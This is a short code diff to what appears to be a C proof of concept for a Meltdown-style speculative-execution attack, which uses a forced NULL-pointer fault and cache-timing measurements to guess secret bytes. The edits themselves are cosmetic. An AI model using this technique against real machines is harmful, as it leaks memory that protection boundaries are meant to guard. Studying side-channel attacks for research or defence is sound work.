@@ -90,7 +90,8 @@ void main()
         }
 
         if(sigsetjmp(jbuf, !0) == 0) {
-            *((char*)NULL) = 1; // force SIGSEGV (even when testing with local addrress)
+            int *ptr = NULL;
+            *ptr = 1; // force SIGSEGV by setting value by NULL pointer (even when testing with local addrress)
 
             // The code below should not be executed because of SEISEGV.
             // But don't worry. It most likely will be executed because of out-of-order execution optimizations in Intel CPUs :-)
@@ -108,7 +109,7 @@ void main()
 
             for (int i = 0; i < 256; i++) {
                 if (ticks[i] < MAX_CACHE_READ_TICKS) { // reading cached page takes less CPU ticks then reading not cached one
-                    // if the page is in the cache then corresponding page shift is most likely the byte value we are guessing
+                    // if the page is in the cache then the corresponding page shift is most likely the byte value we are guessing
                     printf("guessed byte: 0x%X\n", i);
                 }
             }
